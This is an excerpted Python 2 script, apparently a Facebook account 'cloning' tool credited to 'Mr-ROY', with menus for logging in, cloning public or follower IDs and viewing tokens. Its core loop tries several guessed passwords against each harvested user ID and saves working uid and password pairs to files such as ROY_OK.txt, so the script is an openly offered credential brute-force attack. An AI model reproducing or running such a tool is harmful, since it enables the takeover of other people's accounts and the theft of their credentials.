...
__author__ = 'Mr-ROY'
__copyright = 'All rights reserved . Copyright  Mr-ROY'
...
def reg():
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923481877663')
        reg()
...
def ip():
    ...
    time.sleep(2)
    print '\033[1;93m Your region: ' + regi
    time.sleep(2)
    print ' \033[1;93mYour network: ' + network
    time.sleep(2)
    print ' Loading ...'
    time.sleep(2)
    log_menu()
...
def log_menu():
	...
	print 47 * '-'
        print '\033[1;97m[1] Login with FaceBook'
        print '\033[1;92l7m[2] Login with token'
        print '\033[1;97m[3] Follow Mr-IJAXO On Fb'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─Mr-ROY➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://www.facebook.com/abo.safiopali.5')
    else:
        print ''
...
def menu():
    ...
    print ' ------------------------------------------ '
    print '\033[1;91m[1] Start Cloning' 
    print '\033[1;91m[2] Follow Mr-Robot'
    print '\033[1;91m[3] View token'
    print '\033[1;91m[4] Logout'
    print '\033[1;91m[5] Delete trash files'
    menu_s()


def menu_s():
    ms = raw_input('\033[1;92m╰─Mr-ROY➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://www.facebook.com/abo.safiopali.5 /')
...
def crack():
    ...
    print 47 * '-'
    print '\033[1;91m[1] Public id cloning'
    print '\033[1;97m[2] Followers cloning'
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─Mr-ROY➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mAHK Afridi Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[ROY-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/AHK_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;91m[ROY-CP]➤ ' + uid + ' | ' + pass1

                cp = open('ROY_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[ROY-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/ROY_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;91m[ROY-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('ROY_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[ROY-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/ROY_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;91m[ROY-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('ROY_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ROY-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/ROY_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mROY BLACK HATE HACKER'
